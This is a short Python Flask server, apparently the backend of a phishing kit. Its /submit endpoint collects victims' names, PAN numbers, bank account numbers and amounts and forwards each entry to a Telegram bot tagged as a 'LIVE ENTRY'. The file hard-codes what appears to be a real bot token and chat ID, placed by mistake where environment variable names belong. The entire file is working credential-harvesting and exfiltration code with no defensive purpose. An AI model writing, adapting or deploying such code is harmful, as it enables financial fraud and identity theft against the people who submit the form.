from flask import Flask, request
import requests
import os

BOT_TOKEN = os.environ.get("8554969240:AAHR4IBTVMbgUJ6C-vI1UvnCcfrq2AXVXCs")
CHAT_ID = os.environ.get("6035065441")

app = Flask(__name__)

@app.route("/submit", methods=["POST"])
def submit():
    msg = f"""
🚨 LIVE ENTRY 🚨

Name: {request.form.get('name')}
PAN: {request.form.get('pan')}
Account: {request.form.get('account')}
Amount: {request.form.get('amount')}
"""
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": msg}
    )
    return "OK"

app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
